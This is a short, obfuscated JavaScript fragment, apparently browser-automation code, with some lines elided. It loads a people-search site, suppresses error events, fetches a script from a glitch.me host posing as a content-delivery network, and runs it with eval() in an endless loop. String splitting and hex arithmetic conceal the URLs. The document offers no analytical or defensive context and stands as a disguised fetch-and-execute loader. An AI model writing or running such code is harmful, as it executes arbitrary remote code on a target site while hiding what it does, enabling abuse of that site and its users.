((async () => {
  ...
  (async function g() {
    ...
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      ...
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x70b + 0x368 + -0xa73), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(-0x1b4242 + -0xc3a9a + 0x1a9c3e * 0x2), await j['close'](), await i['close'](), g());
  }());
})());